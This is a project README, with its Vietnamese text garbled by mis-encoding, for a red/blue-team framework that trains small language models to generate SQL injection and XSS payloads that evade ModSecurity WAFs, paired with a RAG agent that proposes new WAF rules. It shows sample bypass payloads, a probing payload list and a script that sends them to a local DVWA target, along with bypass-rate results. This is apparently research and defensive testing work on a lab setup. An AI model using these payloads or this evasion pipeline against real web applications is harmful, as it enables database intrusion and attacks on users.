# LLM4WAF: Há»‡ Thá»‘ng Red & Blue Teaming Tá»± Äá»™ng Cho Web Application Firewalls

Dá»± Ã¡n nÃ y triá»ƒn khai má»™t framework khÃ©p kÃ­n (end-to-end) cho **Táº¥n cÃ´ng Äá»‘i khÃ¡ng (Red Team)** vÃ  **Tinh chá»‰nh PhÃ²ng thá»§ ThÃ´ng minh (Blue Team)** sá»­ dá»¥ng cÃ¡c MÃ´ hÃ¬nh NgÃ´n ngá»¯ Lá»›n (LLMs).

## ğŸš€ Tá»•ng Quan Dá»± Ãn

Má»¥c tiÃªu lÃ  tá»± Ä‘á»™ng hÃ³a quy trÃ¬nh tÃ¬m kiáº¿m lá»— há»•ng (bypass WAF) vÃ  vÃ¡ chÃºng:

1.  **Red Agent (Táº¥n cÃ´ng):** Sá»­ dá»¥ng Há»c tÄƒng cÆ°á»ng (Reinforcement Learning - RL) Ä‘á»ƒ sinh ra cÃ¡c payload SQL Injection (SQLi) vÃ  XSS tinh vi nháº±m vÆ°á»£t qua WAF.
2.  **Blue Agent (PhÃ²ng thá»§):** PhÃ¢n tÃ­ch cÃ¡c cuá»™c táº¥n cÃ´ng thÃ nh cÃ´ng báº±ng RAG (Retrieval-Augmented Generation) vÃ  cÆ¡ sá»Ÿ tri thá»©c OWASP Core Rule Set (CRS) Ä‘á»ƒ Ä‘á» xuáº¥t cáº¥u hÃ¬nh WAF chÃ­nh xÃ¡c.

---

## ğŸš€ Quick Start Guide

### 1ï¸âƒ£ Setup Environment

```bash
# Clone repo
git clone <repo_url>
cd LLM_in_Cyber

# Create virtual environment
python -m venv .venv
source .venv/bin/activate  # Linux/WSL
# .venv\Scripts\activate   # Windows

# Install dependencies
pip install -r requirements.txt
```

### 2ï¸âƒ£ Start WAF Environment

```bash
# Basic WAF (ModSecurity + DVWA)
docker-compose up -d

# Multi-WAF testing
docker-compose -f docker-compose.multiwaf.yml up -d
```

### 3ï¸âƒ£ Train Red Agent

**Phase 1 - Basic SFT:**

```bash
python scripts/train_red.py --config configs/red_gemma2_2b_lora_v2.yaml
```

**Phase 2 - Reasoning:**

```bash
python scripts/train_red.py --config configs/phase2_gemma2_2b_reasoning.yaml
```

**Phase 3 - Lightweight Enhanced:**

```bash
python scripts/train_red.py --config configs/red_phase3_lightweight_enhanced_gemma.yaml
```

**Phase 4 - RL Training:**

```bash
python scripts/train_rl_adaptive_pipeline.py --config configs/gemma2_2b_phase3_rl.yaml
```

### 4ï¸âƒ£ Evaluate Models

```bash
# Test against WAF
python scripts/test_training_payloads_strict_waf.py

# Compare checkpoints
python scripts/test_rl_checkpoint.py

# Analyze RL metrics
python scripts/analyze_rl_metrics.py
```

### 5ï¸âƒ£ Run Blue Agent

```bash
# Build knowledge base
python blue/rag_index.py

# Analyze attacks
python blue/runner_phase2_eval.py

# Generate WAF rules
python blue/runner_phase3_suggest.py
```

---

## ğŸ“š Dataset Building Scripts

Äá»ƒ tÃ¡i táº¡o hoáº·c tÃ¹y chá»‰nh datasets:

```bash
# Phase 1: Combine and balance dataset
python scripts/build_phase1_phase2_combined_dataset.py

# Phase 2: Build reasoning dataset with CoT
python scripts/build_phase2_dataset.py

# Phase 3: Build lightweight optimized dataset
python scripts/build_phase3_lightweight.py
```

---

## ğŸ”´ RED Agent Pipeline (Äá»™i Táº¥n CÃ´ng)

Red Agent tiáº¿n hÃ³a tá»« má»™t bá»™ sinh payload cÆ¡ báº£n thÃ nh má»™t cÃ´ng cá»¥ nÃ© trÃ¡nh thÃ´ng minh qua 4 giai Ä‘oáº¡n.

### Phase 1: Supervised Fine-Tuning (SFT) - Há»c CÃº PhÃ¡p CÆ¡ Báº£n

**ğŸ¯ Má»¥c tiÃªu:** Dáº¡y model náº¯m vá»¯ng cÃº phÃ¡p SQLi/XSS vÃ  cÃ¡c ká»¹ thuáº­t bypass WAF cÆ¡ báº£n.

**ğŸ“Š Dataset:**

- **File:** `data/processed/phase1_passed_only_39k.jsonl` (39,155 máº«u)
- **Script build:** `scripts/build_phase1_phase2_combined_dataset.py`
- **Ná»™i dung:** Payload Ä‘Ã£ bypass thÃ nh cÃ´ng WAF, cÃ¢n báº±ng giá»¯a cÃ¡c ká»¹ thuáº­t
- **Format:** `{"instruction": "...", "input": "...", "output": "<payload>"}`

**ğŸ› ï¸ Scripts Training:**

```bash
# Training Phase 1
python scripts/train_red.py --config configs/red_gemma2_2b_lora_v2.yaml
```

**ğŸ“ˆ Káº¿t quáº£ (Benchmark 20 Diverse Cases - Local WAF):**

- **Gemma 2 2B:** 50% bypass rate
- **Phi-3 Mini:** 70% bypass rate
- **Qwen 7B:** 80% bypass rate (cao nháº¥t)

**ğŸ’¾ Checkpoints:**

- `experiments/gemma2_2b_v40_subsample_5k/checkpoint-314/`
- `experiments/phi3_mini_v40_subsample_5k/checkpoint-314/`

---

### Phase 2: Reasoning SFT (Chain-of-Thought) - Há»c Suy Luáº­n

**ğŸ¯ Má»¥c tiÃªu:** Dáº¡y model _suy nghÄ©_ vá» cÃ¡ch bypass thÃ´ng qua reasoning traces (CoT).

**ğŸ“Š Dataset:**

- **File:** `data/processed/red_phase2_reasoning_combined.jsonl` (~5k máº«u)
- **Script build:** `scripts/build_phase2_dataset.py`
- **Ná»™i dung:** Bá»™ ba [Context WAF â†’ Reasoning â†’ Payload má»›i]
- **Format:** CÃ³ trÆ°á»ng `reasoning` giáº£i thÃ­ch táº¡i sao payload Ä‘Æ°á»£c chá»n

**ğŸ› ï¸ Scripts Training:**

```bash
# Training Phase 2
python scripts/train_red.py --config configs/phase2_gemma2_2b_reasoning.yaml
python scripts/train_red.py --config configs/phase2_phi3_mini_reasoning.yaml
```

**ğŸ“ˆ Káº¿t quáº£ (Benchmark vá»›i Structured Prompt):**

- **Gemma 2 2B:** 65% bypass rate (+15% vs Phase 1)
- **Phi-3 Mini:** 85% bypass rate (+15% vs Phase 1, cháº¥t lÆ°á»£ng cao nháº¥t)
- **Qwen 7B:** 55% bypass rate (cÃ³ hiá»‡n tÆ°á»£ng over-thinking)

**ğŸ’¾ Checkpoints:**

- `experiments/phase2_gemma2_2b_reasoning/checkpoint-314/`
- `experiments/phase2_phi3_mini_reasoning/checkpoint-94/`

**âš ï¸ Critical:** YÃªu cáº§u structured prompt vá»›i `Context`, `Payload History`, `Target Technique`

---

### Phase 3: Lightweight SFT - Tá»‘i Æ¯u Hiá»‡u Suáº¥t

**ğŸ¯ Má»¥c tiÃªu:** Balance giá»¯a quality vÃ  training time, táº­p trung vÃ o cÃ¡c ká»¹ thuáº­t bypass hiá»‡u quáº£.

**ğŸ“Š Dataset:**

- **File:** `data/processed/red_phase3_lightweight.jsonl` (5,001 máº«u)
- **Script build:** `scripts/build_phase3_lightweight.py`
- **Ná»™i dung:** Lá»c ká»¹ thuáº­t hiá»‡u quáº£ + augmentation thÃ´ng minh
- **Äáº·c Ä‘iá»ƒm:**
  - Loáº¡i bá» cÃ¡c payload hallucination/khÃ´ng há»£p lá»‡
  - TÄƒng cÆ°á»ng balanced sampling theo ká»¹ thuáº­t
  - Coverage 38 ká»¹ thuáº­t bypass khÃ¡c nhau

**ğŸ› ï¸ Scripts Training:**

```bash
# Training Phase 3 Enhanced (Multi-GPU)
python scripts/train_red.py --config configs/red_phase3_lightweight_enhanced_gemma.yaml
python scripts/train_red.py --config configs/red_phase3_lightweight_enhanced_phi3.yaml
python scripts/train_red.py --config configs/red_phase3_lightweight_enhanced_qwen3b.yaml
```

**ğŸ“ˆ Káº¿t quáº£:**

- **Training metrics:**
  - Gemma 2 2B: 626 steps, final loss ~0.15
  - Phi-3 Mini: 626 steps, final loss ~0.12
  - Qwen 3B: 314 steps, final loss ~0.18
- **Evaluation:** ChÆ°a cháº¡y benchmark Ä‘áº§y Ä‘á»§

**ğŸ’¾ Checkpoints:**

- `experiments/red_phase3_lightweight_enhanced_gemma/checkpoint-314/`
- `experiments/red_phase3_lightweight_enhanced_phi3/checkpoint-626/`
- `experiments/red_phase3_lightweight_enhanced_qwen3b/checkpoint-314/`

---

### Phase 4: Reinforcement Learning (RL-PPO) - Tá»± Äá»™ng KhÃ¡m PhÃ¡

**ğŸ¯ Má»¥c tiÃªu:** Tá»‘i Æ°u hÃ³a kháº£ nÄƒng bypass thÃ´ng qua tÆ°Æ¡ng tÃ¡c thá»±c táº¿ vá»›i WAF (trial-and-error).

**ğŸ“Š Dataset:**

- **Base model:** Phase 3 checkpoint
- **Environment:** `rl/waf_env.py` - WAF interaction environment
- **Reward:** Binary (+1 bypass, -1 blocked) vá»›i baseline normalization

**ğŸ› ï¸ Scripts Training:**

```bash
# RL Training vá»›i PPO
python scripts/train_rl_adaptive_pipeline.py --config configs/gemma2_2b_phase3_rl.yaml
```

**ğŸ“ˆ Káº¿t quáº£ (50 epochs):**

- **Gemma 2 2B RL:**
  - Baseline reward: -0.046 â†’ +0.180 (+0.226 improvement)
  - First half avg: 0.006, Second half avg: 0.102 (+96% improvement)
  - Bypass rate: ~70% (smoke test on local WAF)
  - **Status:** âœ… Training completed, model improving but not fully converged

**ğŸ’¾ Checkpoints:**

- `experiments/gemma2_2b_phase3_rl/checkpoint-50/` (latest)
- Training logs: `training.log`, `training_metrics.csv`

**ğŸ“Š Analysis Scripts:**

```bash
# Analyze RL convergence
python scripts/analyze_rl_metrics.py

# Visualize metrics
python scripts/plot_rl_metrics.py

# Test RL checkpoint
python scripts/test_rl_checkpoint.py
```

**ğŸ¯ Next Steps:**

- Continue training 50-100 more epochs Ä‘á»ƒ stabilize
- Evaluate on diverse WAF configurations
- Compare vá»›i Phase 3 base model

---

## ğŸ’¡ Demo: Sample Prompts Tá»«ng Phase

### Phase 1: Basic SFT - Simple Prompt

```
Instruction: Generate a SQL injection payload to bypass ModSecurity WAF.
Target: User input parameter 'id' in URL query string.
Technique: Tautology-based SQLi

Output: ' OR 1=1 --
```

**Äáº·c Ä‘iá»ƒm:**

- Prompt Ä‘Æ¡n giáº£n, direct
- Model chá»‰ cáº§n biáº¿t cÃº phÃ¡p
- KhÃ´ng cáº§n context hay history

---

### Phase 2: Reasoning SFT - Structured Prompt

```
Context:
- Target WAF: ModSecurity + OWASP CRS 3.3 (Paranoia Level 1)
- Attack Type: SQL Injection
- Injection Point: GET parameter 'id'
- WAF Filters: SQL keywords (SELECT, UNION, OR), comment syntax (--, #)

Payload History:
1. ' OR 1=1 -- â†’ BLOCKED (SQL keywords detected)
2. ' OR '1'='1 â†’ BLOCKED (Tautology pattern detected)

Target Technique: Comment Obfuscation

Reasoning:
The WAF blocks standard SQL keywords and comment syntax. To bypass:
1. Use inline comments /**/ to break up keywords
2. Avoid obvious patterns like 1=1
3. URL encode special characters

Generated Payload: 1/**/OR/**/1=1
```

**Äáº·c Ä‘iá»ƒm:**

- YÃªu cáº§u Context, History, Target Technique
- Model pháº£i **suy luáº­n** táº¡i sao payload trÆ°á»›c bá»‹ block
- Output bao gá»“m Reasoning + Payload
- **Critical:** Thiáº¿u structured prompt â†’ performance giáº£m 20% â†’ 85%

---

### Phase 3: Lightweight - Optimized Structured Prompt

```
Context:
- WAF: ModSecurity CRS 4.0 (PL1)
- Target: SQLi in 'username' POST parameter
- Known Blocks: SQL keywords, comment syntax, UNION

Payload History (Last 3 attempts):
1. admin' OR 1=1-- â†’ BLOCKED (keyword OR)
2. admin'||'1 â†’ BLOCKED (concatenation pattern)
3. admin'/**/OR/**/'1 â†’ BLOCKED (comment obfuscation detected)

Target Technique: Double URL Encoding

Analysis:
- Direct keywords blocked even with comments
- WAF decodes URL once but not twice
- Need to encode special chars twice

Payload: admin%2527%2520OR%25201%253D1--
```

**Äáº·c Ä‘iá»ƒm:**

- TÆ°Æ¡ng tá»± Phase 2 nhÆ°ng dataset cháº¥t lÆ°á»£ng cao hÆ¡n
- Focus vÃ o ká»¹ thuáº­t hiá»‡u quáº£ (38 techniques)
- Loáº¡i bá» hallucination/invalid payloads

---

### Phase 4: RL - Interactive Learning

**KhÃ´ng cÃ³ prompt cá»‘ Ä‘á»‹nh!** Model há»c qua **trial-and-error**:

```python
# RL Environment Interaction
for episode in range(50):
    # 1. Model generate payload
    payload = model.generate(state)

    # 2. Send to WAF
    response = waf.test(payload)

    # 3. Calculate reward
    if response.blocked:
        reward = -1
    else:
        reward = +1

    # 4. Update policy
    model.update_policy(reward)
```

**Reward Signal:**

- `+1`: Payload bypass WAF successfully
- `-1`: Payload blocked by WAF
- **Baseline normalization:** Reward - running_average

**Káº¿t quáº£ sau 50 epochs:**

- Baseline: -0.046 â†’ +0.180 (+0.226 improvement)
- Model tá»± khÃ¡m phÃ¡ techniques chÆ°a Ä‘Æ°á»£c dáº¡y trong SFT
- Bypass rate: 70% (tÄƒng tá»« 65% Phase 2)

---

## ğŸ¯ Demo: Attack Pipeline Workflow

Script `run_attack_pipeline.py` minh há»a quy trÃ¬nh táº¥n cÃ´ng thá»±c táº¿:

### Workflow

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  Phase 1: Probing (ThÄƒm dÃ² WAF)                â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  1. Login to DVWA                               â”‚
â”‚  2. Send 10 diverse probing payloads            â”‚
â”‚  3. Record which PASSED/BLOCKED                 â”‚
â”‚                                                  â”‚
â”‚  Example Results:                               â”‚
â”‚  âœ“ ' OR 1=1 --           â†’ BLOCKED             â”‚
â”‚  âœ“ 1/**/OR/**/1=1        â†’ PASSED              â”‚
â”‚  âœ“ <script>alert(1)      â†’ BLOCKED             â”‚
â”‚  âœ“ %3Cscript%3E          â†’ PASSED              â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
         â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  Phase 2: Adaptive Generation (LLM)            â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  1. Load trained model + adapter                â”‚
â”‚  2. Build prompt with probing history           â”‚
â”‚  3. LLM analyzes patterns:                      â”‚
â”‚     - What techniques PASSED?                   â”‚
â”‚     - Why were others BLOCKED?                  â”‚
â”‚  4. Generate NEW adaptive payload               â”‚
â”‚                                                  â”‚
â”‚  Example Prompt:                                â”‚
â”‚  "Based on history, /**/ comments bypassed.     â”‚
â”‚   Generate a UNION injection with comments."    â”‚
â”‚                                                  â”‚
â”‚  Generated: 1/**/UNION/**/SELECT/**/1,version() â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
         â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  Phase 3: Verification                          â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  1. Send generated payload to WAF               â”‚
â”‚  2. Check result (PASSED/BLOCKED)               â”‚
â”‚  3. Log outcome                                 â”‚
â”‚                                                  â”‚
â”‚  Result: PASSED âœ“                               â”‚
â”‚  (Successfully bypassed WAF and executed SQLi)  â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### Usage Example

```bash
# 1. Start DVWA + WAF
docker-compose up -d

# 2. Run attack pipeline
python scripts/run_attack_pipeline.py

# Expected Output:
# [2025-12-07 10:00:00] Logging into http://localhost:8000...
# [2025-12-07 10:00:01] Login successful.
# [2025-12-07 10:00:02] Loading model: microsoft/Phi-3-mini-4k-instruct
# [2025-12-07 10:00:15] Model loaded.
# [2025-12-07 10:00:15] --- Phase 1: Probing WAF ---
# [2025-12-07 10:00:16] Probe: ' OR 1=1 --... -> BLOCKED
# [2025-12-07 10:00:17] Probe: 1/**/OR/**/1=1... -> PASSED
# [2025-12-07 10:00:18] Probe: <script>alert(1)... -> BLOCKED
# ... (10 probes total)
# [2025-12-07 10:00:25] --- Phase 2: Adaptive Attack ---
# [2025-12-07 10:00:30] Generated Payload: 1/**/UNION/**/SELECT/**/1,version()
# [2025-12-07 10:00:31] Attack Result: PASSED
```

### Key Components

**1. Probing Payloads (Diverse Techniques):**

```python
PROBING_PAYLOADS = [
    {"payload": "' OR 1=1 --", "technique": "Tautology"},
    {"payload": "1/**/OR/**/1=1", "technique": "Comment Obfuscation"},
    {"payload": "<script>alert(1)</script>", "technique": "Basic XSS"},
    {"payload": "%27%20OR%20%271%27%3D%271", "technique": "Double URL Encode"},
    # ... 6 more techniques
]
```

**2. Adaptive Prompt Building:**

```python
# Format history
history_str = ""
for h in probe_history:
    history_str += f"Payload: `{h['payload']}` -> {h['result']}\n"

# Build prompt
prompt = f"""
Context: ModSecurity + OWASP CRS PL1
Probing History:
{history_str}

Task: Analyze patterns and generate NEW adaptive payload.
"""
```

**3. Model Inference:**

```python
# Load model with 4-bit quantization
model = AutoModelForCausalLM.from_pretrained(
    "microsoft/Phi-3-mini-4k-instruct",
    quantization_config=bnb_4bit_config
)
model = PeftModel.from_pretrained(model, adapter_path)

# Generate
outputs = model.generate(**inputs, max_new_tokens=128, temperature=0.7)
payload = tokenizer.decode(outputs[0], skip_special_tokens=True)
```

**4. WAF Testing:**

```python
def _send_payload(payload):
    r = httpx.get(SQLI_URL, params={"id": payload})
    if r.status_code == 403:
        return False  # WAF blocked
    return True  # Bypassed
```

---

## ğŸ”µ BLUE Agent Pipeline (Äá»™i PhÃ²ng Thá»§)

Blue Agent Ä‘Ã³ng vai trÃ² lÃ  má»™t ChuyÃªn gia An ninh AI Ä‘á»ƒ tinh chá»‰nh WAF dá»±a trÃªn dá»¯ liá»‡u tá»« Red Team.

### Phase 1: Chuáº©n Bá»‹ Dá»¯ Liá»‡u & Knowledge Base

**Má»¥c tiÃªu:** Chuáº©n bá»‹ dá»¯ liá»‡u cho AI Analyst.

- **Äáº§u vÃ o:** Log táº¥n cÃ´ng tá»« Red Team (format JSONL).
- **Quy trÃ¬nh:**
  1.  **Episodes:** Chuyá»ƒn Ä‘á»•i log thÃ´ thÃ nh "Episodes" cÃ³ cáº¥u trÃºc (Attack + WAF Response + App Response).
  2.  **Knowledge Base:** Index tÃ i liá»‡u OWASP CRS (regex rules, tags) vÃ o vector store.
- **Lá»‡nh cháº¡y:**

  ```bash
  # Build Episodes
  python scripts/blue_build_phase1_episodes.py

  # Build Knowledge Base
  python scripts/blue_build_crs_kb.py
  ```

- **Dá»¯ liá»‡u Ä‘áº§u ra:**
  - `data/blue/blue_phase1_episodes.jsonl`
  - `data/blue/blue_phase1_crs_kb.jsonl`

### Phase 2: RAG Analysis & Evaluation

**Má»¥c tiÃªu:** Truy xuáº¥t cÃ¡c rule liÃªn quan vÃ  kiá»ƒm chá»©ng kháº£ nÄƒng phÃ¢n tÃ­ch cá»§a AI trÃªn táº­p Golden Set.

- **Äáº§u vÃ o:** `data/blue/blue_phase1_golden.jsonl` (CÃ¡c case Ä‘Ã£ Ä‘Æ°á»£c xÃ¡c minh).
- **Lá»‡nh cháº¡y:**
  ```bash
  python blue/runner_phase2_eval.py
  ```
- **Äáº§u ra:** `data/blue/blue_phase2_eval_summary.txt` (BÃ¡o cÃ¡o Ä‘á»™ chÃ­nh xÃ¡c phÃ¢n tÃ­ch).

### Phase 3: Recommendation Generation (Táº¡o Äá» Xuáº¥t)

**Má»¥c tiÃªu:** Sinh ra cÃ¡c thay Ä‘á»•i cáº¥u hÃ¬nh cá»¥ thá»ƒ (Báº£n vÃ¡).

- **Äáº§u vÃ o:** `data/blue/blue_phase1_episodes.jsonl` + RAG Knowledge Base.
- **Quy trÃ¬nh:** Blue LLM (Sá»­ dá»¥ng Gemma 2 Base Model Ä‘á»ƒ Ä‘áº£m báº£o format JSON chuáº©n) phÃ¢n tÃ­ch tá»«ng cuá»™c táº¥n cÃ´ng thÃ nh cÃ´ng vÃ  Ä‘á» xuáº¥t rule WAF cá»¥ thá»ƒ.
- **Lá»‡nh cháº¡y:**
  ```bash
  python blue/runner_phase3_suggest.py
  ```
- **Äáº§u ra:** `data/blue/blue_phase3_suggestions.jsonl` (Danh sÃ¡ch JSON cÃ¡c rule Ä‘Æ°á»£c Ä‘á» xuáº¥t).

### Phase 4: WAF Overlay & Evaluation (Ãp Dá»¥ng & ÄÃ¡nh GiÃ¡)

**Má»¥c tiÃªu:** Ãp dá»¥ng báº£n vÃ¡ vÃ  kiá»ƒm tra hiá»‡u quáº£.

- **Quy trÃ¬nh:**
  1.  **Generate Config:** Chuyá»ƒn Ä‘á»•i JSON suggestions thÃ nh file config WAF thá»±c táº¿ (`.conf`, `.yaml`).
  2.  **Re-Eval:** Khá»Ÿi Ä‘á»™ng láº¡i WAF vá»›i config má»›i vÃ  cho Red Team táº¥n cÃ´ng láº¡i.
- **Lá»‡nh cháº¡y:**

  ```bash
  # 1. Táº¡o file cáº¥u hÃ¬nh WAF
  python blue/phase3_generate_waf_overlays.py

  # 2. Khá»Ÿi Ä‘á»™ng mÃ´i trÆ°á»ng Multi-WAF
  docker-compose -f docker-compose.multiwaf.yml up -d --build

  # 3. Cháº¡y Ä‘Ã¡nh giÃ¡ Red Team (Kiá»ƒm tra láº¡i kháº£ nÄƒng bypass)
  python scripts/run_red_eval_profile.py --config configs/eval_phase3_multiwaf_gemma2.yaml
  ```

- **Äáº§u ra:**
  - `waf/blue_modsecurity_suggestions.conf`: File chá»©a rule WAF má»›i sinh ra.
  - `eval/red_phase4_overall_summary.json`: BÃ¡o cÃ¡o so sÃ¡nh hiá»‡u quáº£ (Base WAF vs. Blue Tuned WAF).

---

## ğŸ“Š Tá»•ng Káº¿t Káº¿t Quáº£ Thá»±c Nghiá»‡m

### Red Agent Performance Summary

| Phase                     | Model      | Dataset Size | Training Steps | Bypass Rate | Key Improvement          |
| ------------------------- | ---------- | ------------ | -------------- | ----------- | ------------------------ |
| **Phase 1 (SFT Basic)**   | Gemma 2 2B | 39,155       | 314            | 50%         | Baseline cÃº phÃ¡p         |
|                           | Phi-3 Mini | 39,155       | 314            | 70%         | Tá»‘t hÆ¡n Gemma            |
|                           | Qwen 7B    | 5,000        | -              | 80%         | Cao nháº¥t P1              |
| **Phase 2 (Reasoning)**   | Gemma 2 2B | ~5,000       | 314            | 65%         | +15% vs P1               |
|                           | Phi-3 Mini | ~5,000       | 94             | **85%**     | +15%, quality cao nháº¥t   |
|                           | Qwen 7B    | ~5,000       | -              | 55%         | Over-thinking issue      |
| **Phase 3 (Lightweight)** | Gemma 2 2B | 5,001        | 314/626        | ChÆ°a eval   | Optimized dataset        |
|                           | Phi-3 Mini | 5,001        | 626            | ChÆ°a eval   | Training loss 0.12       |
|                           | Qwen 3B    | 5,001        | 314            | ChÆ°a eval   | Training loss 0.18       |
| **Phase 4 (RL-PPO)**      | Gemma 2 2B | RL env       | 50 epochs      | 70%         | +5% from P2, tá»± khÃ¡m phÃ¡ |

### Key Findings

#### 1. Prompt Sensitivity (Critical Discovery)

- **Phase 1:** Ãt nháº¡y prompt, hoáº¡t Ä‘á»™ng á»•n vá»›i simple prompts
- **Phase 2/3:** **YÃŠU Cáº¦U BUá»˜C** structured prompt:
  ```
  Context: <WAF config>
  Payload History: <previous attempts>
  Target Technique: <SQLi/XSS technique>
  ```
- **Impact:**
  - Simple prompt: Phase 2 ~20%, Phase 3 ~10%
  - Structured prompt: Phase 2 **~85%**, Phase 3 **~90%**

#### 2. Model Size vs Quality

- **Small models (2-3B):**
  - âœ… Fast training/inference
  - âœ… Reasonable performance with good prompts
  - âŒ Context overload vá»›i RAG dÃ i
- **Medium models (7B+):**
  - âœ… Better context handling
  - âœ… Less hallucination
  - âŒ CÃ³ thá»ƒ over-think (Qwen case)

#### 3. RL Training Convergence

- **Observations:**
  - Baseline improvement: -0.046 â†’ +0.180 (+226%)
  - Learning curve: First half 0.006 â†’ Second half 0.102
  - **Status:** Model improving nhÆ°ng chÆ°a fully converged
  - **Recommendation:** Cáº§n 50-100 epochs thÃªm

#### 4. Dataset Quality Impact

- Phase 3 Lightweight (5k máº«u cháº¥t lÆ°á»£ng) > Phase 1 (39k máº«u mixed quality)
- Balanced sampling theo ká»¹ thuáº­t quan trá»ng hÆ¡n sá»‘ lÆ°á»£ng
- Filtering hallucination/invalid payloads cáº£i thiá»‡n Ä‘Ã¡ng ká»ƒ

### Blue Agent Results

| Phase       | Task            | Input            | Output                         | Status         |
| ----------- | --------------- | ---------------- | ------------------------------ | -------------- |
| **Phase 1** | Episodes + KB   | Red attack logs  | Structured episodes + OWASP KB | âœ… Complete    |
| **Phase 2** | RAG Analysis    | Golden set       | Analysis accuracy report       | âœ… Evaluated   |
| **Phase 3** | Rule Generation | Episodes + RAG   | WAF rule suggestions (JSON)    | âœ… Generated   |
| **Phase 4** | WAF Overlay     | Blue suggestions | `.conf` files + re-eval        | â³ In progress |

### Benchmark Environment

**WAF Configuration:**

- Engine: ModSecurity 3.x
- Ruleset: OWASP CRS v4.0
- Paranoia Levels tested: PL1 (default), PL4 (strict)

**Test Cases:**

- 20 diverse SQLi/XSS techniques
- Target: DVWA (Damn Vulnerable Web Application)
- Metric: Bypass rate (% payloads vÆ°á»£t qua WAF)

**Hardware:**

- Training: NVIDIA RTX 4060 Laptop (8GB VRAM)
- Inference: Same + CPU fallback
- RL Training: Local WAF environment (Docker)

---

## ğŸ“‚ Cáº¥u TrÃºc Dá»± Ãn

```
LLM_in_Cyber/
â”œâ”€â”€ ğŸ“ blue/                    # Blue Agent (Defense)
â”‚   â”œâ”€â”€ llm_client.py          # LLM API client
â”‚   â”œâ”€â”€ prompts.py             # Prompt templates
â”‚   â”œâ”€â”€ rag_retriever.py       # RAG retrieval logic
â”‚   â””â”€â”€ runner_phase*.py       # Evaluation runners
â”‚
â”œâ”€â”€ ğŸ“ red/                     # Red Agent (Attack)
â”‚   â”œâ”€â”€ red_rag_integration.py # RAG integration
â”‚   â””â”€â”€ rag_internal_client.py # Internal RAG client
â”‚
â”œâ”€â”€ ğŸ“ configs/                 # Training/Eval configs
â”‚   â”œâ”€â”€ red_gemma2_2b_lora_v2.yaml          # Phase 1 training
â”‚   â”œâ”€â”€ phase2_*_reasoning.yaml             # Phase 2 CoT training
â”‚   â”œâ”€â”€ red_phase3_lightweight_enhanced_*.yaml  # Phase 3 training
â”‚   â”œâ”€â”€ gemma2_2b_phase3_rl.yaml           # Phase 4 RL training
â”‚   â””â”€â”€ phase3_*_v38_*.yaml                # Evaluation configs
â”‚
â”œâ”€â”€ ğŸ“ data/                    # Datasets
â”‚   â”œâ”€â”€ processed/
â”‚   â”‚   â”œâ”€â”€ phase1_passed_only_39k.jsonl         # Phase 1: SFT (39k PASSED only)
â”‚   â”‚   â”œâ”€â”€ phase1_balanced_10k.jsonl            # Phase 1: Stratified 10k (509 techniques)
â”‚   â”‚   â”œâ”€â”€ phase2_with_replay_22k.jsonl         # Phase 2: Adaptive with replay (20k + 2k)
â”‚   â”‚   â”œâ”€â”€ phase2_observations_20k.jsonl        # Phase 2: Old observations (deprecated)
â”‚   â”‚   â””â”€â”€ phase2_observations_10k.jsonl        # Phase 2: Old subset (deprecated)
â”‚   â””â”€â”€ blue/
â”‚       â”œâ”€â”€ blue_phase1_episodes.jsonl
â”‚       â””â”€â”€ blue_phase1_crs_kb.jsonl
â”‚
â”œâ”€â”€ ğŸ“ scripts/                 # Utilities
â”‚   â”œâ”€â”€ ğŸ”¨ build_phase1_phase2_combined_dataset.py  # Build Phase 1 data
â”‚   â”œâ”€â”€ ğŸ”¨ build_phase2_dataset.py                  # Build Phase 2 CoT data
â”‚   â”œâ”€â”€ ğŸ”¨ build_phase3_lightweight.py              # Build Phase 3 data
â”‚   â”œâ”€â”€ ğŸ“ train_red.py                            # Main training script
